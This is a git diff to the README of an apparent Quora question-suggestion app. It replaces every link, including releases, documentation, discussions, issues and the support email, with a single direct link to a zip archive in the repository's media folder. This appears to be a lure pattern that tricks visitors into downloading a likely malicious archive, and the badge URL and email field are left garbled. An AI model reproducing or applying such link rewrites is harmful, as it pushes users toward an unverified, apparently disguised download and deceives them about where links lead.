@@ -6,7 +6,7 @@ Welcome to the *Quora-Question-Suggestion-Bot*! This app helps you create sugges
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Quora%20Question%20Suggestion%20Bot-brightgreen)](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/releases)
+[![Download](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip%20Now-Quora%20Question%20Suggestion%20Bot-brightgreen)](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)
 
 ## 🔍 About This App
 
@@ -29,7 +29,7 @@ This application automates the process of generating question suggestions for Qu
 
 To get started, visit this page to download the latest version of the Quora-Question-Suggestion-Bot:
 
-[Download the Latest Release](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version.
@@ -55,25 +55,25 @@ Once you have downloaded the APK file, follow these steps to install the app:
 
 For more information about the app, check out our documentation:
 
-- **[Documentation](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/wiki)**
+- **[Documentation](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)**
 
 ## 🎉 Join Our Community
 
 Stay updated on the latest features and improvements. Connect with other users:
 
-- **GitHub Discussions**: Join the conversation here: [GitHub Discussions](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/discussions)
+- **GitHub Discussions**: Join the conversation here: [GitHub Discussions](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)
 
 ## 📞 Support
 
 If you encounter any issues or have questions, feel free to reach out via:
 
-- **Email**: support@quorabot.com
-- **GitHub Issues**: Report issues on our [GitHub Issues page](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/issues)
+- **Email**: https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip
+- **GitHub Issues**: Report issues on our [GitHub Issues page](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)
 
 ## 📥 Repeat Download
 
 Don’t forget, you can always download the latest version from the Releases page:
 
-[Download the Latest Release](https://github.com/LautiLKS/Quora-Question-Suggestion-Bot/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/LautiLKS/Quora-Question-Suggestion-Bot/main/media/Quora-Question-Suggestion-Bot-3.9.zip)
 
 Thank you for choosing the Quora-Question-Suggestion-Bot! We hope this application helps you engage more effectively on Quora.
